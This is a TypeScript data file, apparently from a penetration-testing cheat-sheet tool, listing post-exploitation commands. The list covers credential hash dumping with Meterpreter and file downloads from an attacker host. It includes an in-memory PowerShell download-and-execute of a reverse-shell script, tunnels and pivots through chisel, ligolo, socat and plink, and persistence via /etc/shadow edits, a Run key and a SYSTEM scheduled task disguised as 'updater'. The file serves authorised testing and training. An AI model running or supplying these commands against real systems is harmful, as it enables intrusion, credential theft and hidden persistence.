import { Section } from "./types";

export const postSection: Section = {
  id: "post",
  title: "Post Exploitation",
  slug: "post",
  groups: [
    { title: "Meterpreter", commands: [
      { id: "post-1", cmd: "getuid", description: "Current meterpreter identity.", tags: ["all"] },
      { id: "post-2", cmd: "hashdump", description: "Dump local SAM hashes.", tags: ["windows"] },
      { id: "post-2a", cmd: "sysinfo", description: "Meterpreter target system details.", tags: ["all"] },
      { id: "post-2b", cmd: "ps", description: "List target processes.", tags: ["all"] },
    ]},
    { title: "File Transfer Linux", commands: [
      { id: "post-3", cmd: "python3 -m http.server 8000", description: "Host files quickly.", tags: ["linux"] },
      { id: "post-4", cmd: "wget http://{LHOST}:8000/file", description: "Download file with wget.", tags: ["linux"], hasVars: true },
      { id: "post-4a", cmd: "curl http://{LHOST}:8000/file -o file", description: "Download file with curl.", tags: ["linux"], hasVars: true },
      { id: "post-4b", cmd: "scp file {USER}@{RHOST}:/tmp/file", description: "Copy file over SCP.", tags: ["linux"], hasVars: true },
      { id: "post-ref-transfer", cmd: "transfer_2026-03-29.txt", description: "Local reference export (HackTricks transfer/pivot notes). Open the file locally; not a runnable command.", tags: ["all"] },
    ]},
    { title: "File Transfer Windows", commands: [
      { id: "post-5", cmd: "certutil -urlcache -f http://{LHOST}/nc.exe nc.exe", description: "Download via certutil.", tags: ["windows"], hasVars: true },
      { id: "post-6", cmd: "powershell -c \"iwr http://{LHOST}/tool.exe -OutFile tool.exe\"", description: "PowerShell download.", tags: ["windows"], hasVars: true },
      { id: "post-6a", cmd: "bitsadmin /transfer n /download /priority normal http://{LHOST}/tool.exe C:\\Windows\\Temp\\tool.exe", description: "Download with BITS.", tags: ["windows"], hasVars: true },
      { id: "post-6b", cmd: "powershell -ep bypass -c \"iex(New-Object Net.WebClient).DownloadString('http://{LHOST}/Invoke-PowerShellTcp.ps1')\"", description: "In-memory PowerShell execution.", tags: ["windows"], hasVars: true },
    ]},
    { title: "Pivoting & Tunneling", commands: [
      { id: "post-7", cmd: "ssh -L 9999:127.0.0.1:80 {USER}@{RHOST}", description: "Local SSH port forward.", tags: ["linux"], hasVars: true },
      { id: "post-8", cmd: "chisel server -p 8000 --reverse", description: "Start chisel server.", tags: ["all"] },
      { id: "post-9", cmd: "ligolo-ng proxy -selfcert", description: "Ligolo proxy node.", tags: ["all"] },
      { id: "post-10", cmd: "socat TCP-LISTEN:9001,fork TCP:{RHOST}:3389", description: "Socat pivot tunnel.", tags: ["all"], hasVars: true },
      { id: "post-10a", cmd: "chisel client {LHOST}:8000 R:socks", description: "Reverse SOCKS over chisel.", tags: ["all"], hasVars: true },
      { id: "post-10b", cmd: "ssh -D 9050 {USER}@{RHOST}", description: "Dynamic SOCKS proxy with SSH.", tags: ["linux"], hasVars: true },
      { id: "post-10c", cmd: "proxychains nmap -sT -Pn {RHOST}", description: "Scan through SOCKS tunnel.", tags: ["all"], hasVars: true },
      { id: "post-10d", cmd: "ssh -R 8080:127.0.0.1:80 {USER}@{LHOST}", description: "Remote SSH forward back to attacker.", tags: ["linux"], hasVars: true },
      { id: "post-10e", cmd: "socat TCP-LISTEN:{LPORT},fork TCP:{RHOST}:{RPORT}", description: "Generic socat TCP relay.", tags: ["all"], hasVars: true },
      { id: "post-10f", cmd: "ligolo-ng agent -connect {LHOST}:11601 -ignore-cert", description: "Connect Ligolo agent to proxy.", tags: ["all"], hasVars: true },
      { id: "post-10g", cmd: "ssh -N -L {LPORT}:{RHOST}:{RPORT} {USER}@{LHOST}", description: "Bind local port to internal service through jump host.", tags: ["all"], hasVars: true },
      { id: "post-10h", cmd: "chisel client {LHOST}:8000 R:{LPORT}:{RHOST}:{RPORT}", description: "Reverse specific port over chisel.", tags: ["all"], hasVars: true },
      { id: "post-10i", cmd: "plink.exe -ssh -l {USER} -pw {PASS} -R 445:127.0.0.1:445 {LHOST}", description: "Windows reverse tunnel with plink.", tags: ["windows"], hasVars: true },
      { id: "post-10j", cmd: "meterpreter > portfwd add -l {LPORT} -p {RPORT} -r {RHOST}", description: "Meterpreter local port forward.", tags: ["all"], hasVars: true },
      { id: "post-10k", cmd: "meterpreter > autoroute -s {RHOST}/24", description: "Add route in meterpreter session.", tags: ["all"], hasVars: true },
      { id: "post-10l", cmd: "python3 reGeorgSocksProxy.py -p 1080", description: "Use reGeorg socks proxy connector.", tags: ["web", "all"] },
      { id: "post-10m", cmd: "sshuttle -r {USER}@{RHOST} 10.10.0.0/16", description: "Transparent VPN-like pivot with sshuttle.", tags: ["linux"], hasVars: true },
      { id: "post-10n", cmd: "rpivot client --server-ip {LHOST} --server-port {LPORT}", description: "RPivot client for SOCKS pivoting.", tags: ["all"], hasVars: true },
    ]},
    { title: "Persistence Quick Ops", commands: [
      { id: "post-11", cmd: "echo '{USER}:$6$hash$...' | sudo tee -a /etc/shadow", description: "Persist Linux account hash (privileged).", tags: ["linux"], hasVars: true },
      { id: "post-11a", cmd: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d \"C:\\Windows\\Temp\\updater.exe\" /f", description: "Simple user-run key persistence.", tags: ["windows"] },
      { id: "post-11b", cmd: "schtasks /create /tn Updater /tr \"C:\\Windows\\Temp\\updater.exe\" /sc onlogon /ru SYSTEM", description: "Scheduled task persistence.", tags: ["windows"] },
    ]},
  ],
};
